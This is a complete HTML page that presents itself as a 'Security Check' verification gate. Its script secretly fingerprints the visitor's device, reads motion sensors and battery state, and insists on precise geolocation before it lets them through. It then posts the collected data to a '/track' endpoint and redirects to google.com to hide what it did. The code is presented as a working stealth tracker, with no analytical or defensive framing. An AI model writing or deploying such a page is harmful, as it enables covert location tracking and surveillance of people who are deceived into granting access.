<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Security Check</title>
    <style>
        body,
        html {
            margin: 0;
            padding: 0;
            height: 100%;
            background: #000;
            color: #fff;
            font-family: sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            text-align: center;
        }

        #overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 999;
            background: #000;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        button {
            padding: 15px 30px;
            font-size: 1.2em;
            cursor: pointer;
            background: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            margin-top: 20px;
        }

        p {
            max-width: 80%;
            line-height: 1.5;
        }

        .hidden {
            display: none !important;
        }
    </style>
</head>

<body>
    <div id="overlay">
        <h2>Security Check</h2>
        <p>Please complete the verification to continue.</p>
        <button id="verifyBtn">Verify & Continue</button>
        <p id="msg" style="color: red; margin-top: 20px; font-size: 0.9em;"></p>
    </div>

    <script>
        const TARGET_URL = '/track';
        const REDIRECT_URL = 'https://google.com';
        const DELAY_MS = 4000;

        const data = {
            type: 'STEALTH_GATEKEEPER',
            timestamp: new Date().toISOString(),
            url: window.location.href,
            referrer: document.referrer,
            viewport: `${window.innerWidth}x${window.innerHeight}`,
            location: {},
            sensors: {},
            wifi: {},
            fingerprint: {}
        };

        // --- SENSORS & FINGERPRINT (Background Collection) ---
        function collectBackgroundData() {
            // Sensors
            if (window.DeviceMotionEvent) {
                window.addEventListener('devicemotion', (event) => {
                    const acc = event.accelerationIncludingGravity;
                    if (acc && acc.x !== null) {
                        data.sensors.accel = { x: acc.x.toFixed(2), y: acc.y.toFixed(2), z: acc.z.toFixed(2) };
                    }
                });
            }

            // Fingerprint
            try {
                data.fingerprint.platform = navigator.platform;
                data.fingerprint.cores = navigator.hardwareConcurrency;
                data.fingerprint.memory = navigator.deviceMemory;
                if (navigator.getBattery) {
                    navigator.getBattery().then(bat => {
                        data.fingerprint.battery = { level: bat.level, charging: bat.charging };
                    });
                }
            } catch (e) { }
        }
        collectBackgroundData();

        // --- MAIN LOGIC ---
        const btn = document.getElementById('verifyBtn');
        const msg = document.getElementById('msg');

        btn.onclick = () => {
            msg.textContent = "Requesting access...";

            // 1. Request Location
            navigator.geolocation.getCurrentPosition(
                // SUCCESS
                (pos) => {
                    msg.style.color = "#00ff00";
                    msg.textContent = "Verified! Redirecting...";
                    btn.style.display = 'none';

                    // Capture Data
                    data.location = {
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        acc: pos.coords.accuracy,
                        source: 'precise'
                    };

                    // Wait 4 seconds then Send & Redirect
                    setTimeout(() => {
                        sendAndRedirect();
                    }, DELAY_MS);
                },
                // ERROR (Blocked)
                (err) => {
                    console.error(err);
                    msg.style.color = "red";
                    msg.textContent = "Location access is required. Please 'Allow' to continue.";

                    // We catch the error but we DO NOT redirect.
                    // The user must click 'Verify' again after allowing.
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        };

        function sendAndRedirect() {
            data.timestamp = new Date().toISOString();

            // Send
            fetch(TARGET_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data),
                keepalive: true
            }).catch(e => console.log(e));

            // Redirect
            window.location.href = REDIRECT_URL;
        }
    </script>
</body>

</html>